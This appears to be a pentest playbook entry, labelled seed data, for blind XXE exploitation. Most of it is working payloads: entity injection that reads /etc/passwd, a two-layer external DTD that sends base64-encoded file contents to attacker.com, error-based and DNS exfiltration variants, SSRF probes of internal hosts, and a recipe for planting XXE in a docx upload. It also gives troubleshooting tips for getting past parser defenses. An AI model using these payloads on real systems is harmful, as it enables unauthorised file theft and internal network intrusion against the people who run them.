# [Seed] XXE Blind OOB → Exfiltrate /etc/passwd and Internal Network Probing

## Scenario Category
Penetration Testing / Web Vulnerability Exploitation

## Target Overview
A Web endpoint accepts XML request bodies (SOAP / docx upload parsing / custom API) without echoing content (i.e., "Blind XXE"). Leverage external DTD + parameter entity techniques to exfiltrate target files back to the attacker's server.

## Complete Execution Chain

1. Probing Points
   - Any Content-Type containing `xml` / `soap` / file uploads docx/xlsx/pptx (contains XML) / SVG
   - Inject test payload and observe response: errors / time delays / OOB callbacks
2. First try simple XXE with echo
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. No echo but OOB works → Use external DTD
   - Host evil.dtd on your own VPS
   - Trigger the server to load and exfiltrate
4. If OOB also fails → Check if error-based / blind boolean can be used
5. Expanded attack surface after obtaining /etc/passwd:
   - Internal port scanning (XXE → SSRF)
   - Read application config files (database passwords / private keys)
   - Trigger SSRF to hit cloud metadata → see seed-006

## Pitfall Records

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| Direct SYSTEM "file://" errors out | Parser disabled ENTITY references | Switch to parameter entity (%) nesting | 30min |
| File contains `<` `>` `&` causing DTD parsing explosion | XML spec forbids special characters in parameter entities | Wrap with `php://filter` base64 | 40min |
| OOB server port 80 receives callback but payload isn't concatenated properly | Incorrect DTD nesting layers | Strictly follow OOB templates (outer + inner) | 1h |
| File read but only half received | XML limits entity length (XML_MAX_TOKEN_BYTES) | Chunked reading + offset | 1h |
| Internal SSRF all connection refused | Subnet hosting the app doesn't expose internal services | Change to localhost / 127.0.0.1 / internal service name (K8s) | 30min |
| Java application cannot be exploited | Java default XML parser disables SYSTEM | Try `jar:` protocol / or alternative SOAP endpoints might use older Apache Xerces | Hours |

## Toolchain Discoveries

- **XXEinjector** Automated XXE exploitation (Ruby)
- **Burp Collaborator** / **interactsh** are essential for OOB
- **dnslog.cn / oast.online** Domestic/Foreign DNS-only OOB
- File upload scenario: **docx is zip + xml**, modify word/document.xml and re-compress to inject
- **payloads-all-the-things** XXE chapter is the most comprehensive cheatsheet

## Key Code/Commands

OOB standard two-layer DTD (base64 inner layer for file exfiltration):

**evil.dtd (Hosted on attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target Request Body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**Attacker starts HTTP server to receive data**:

```bash
python3 -m http.server 8000
# Received GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF Internal Network Scanning:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error Echo (error-based) — Force the XML parser to return content within error messages:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx Upload XXE** (Many document processing apps are affected):

```bash
unzip target.docx -d unpacked/
# Edit unpacked/word/document.xml, change beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# upload evil.docx
```

## Recommendations for Improvement

- `pentest-tools/references/web-attack-cheatsheet.md` should include a full XXE section (OOB / error / blind / docx upload / svg)
- Add interactsh-client to bootstrap manifest (if not already included)
- Routing already includes XXE, but recommend explicitly adding "XXE OOB Exfiltration" route

## Reusable Patterns & Script Snippets

**XXE Type Decision Tree**:

```text
With Echo           → Exfiltrate directly via SYSTEM "file://"
With Error Echo     → Error-based payload (two-layer nesting + intentional parsing failure trigger)
Blind (No Echo)     → OOB standard two-layer DTD (DNS / HTTP)
DNS OK, HTTP Blocked → Use DNS exfiltration (base32-encoded subdomain)
```

**XXE Protocol Manifest (Testing by parser)**:

```text
file://          → Read local files (most common)
http://, https:// → SSRF
ftp://           → Older Java versions also support
gopher://        → Very few PHP parsers
expect://        → RCE when PHP has expect extension installed
jar://           → Java extracts file inside remote jar
netdoc://        → Older Java alternative to file://
```

**DNS Exfiltration (Weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log receives hostname.attacker.com -->
```

## Evolution Actions
- [ ] Add full XXE section to web-attack-cheatsheet.md
- [ ] Check interactsh-client in bootstrap-manifest
- [x] Routing already includes XXE entrypoint

## Environment Info
- Attacker VPS (Public IP, ports 80/8000/53 open)
- Target: Any Web app accepting XML input (PHP/Java/Python lxml/.NET affected)
- OOB: interactsh / dnslog.cn / Self-hosted DNS

## Sanitisation Requirements
This entry is seed data based on public Web exploitation patterns; no real production targets involved. All domains/IPs are placeholders.
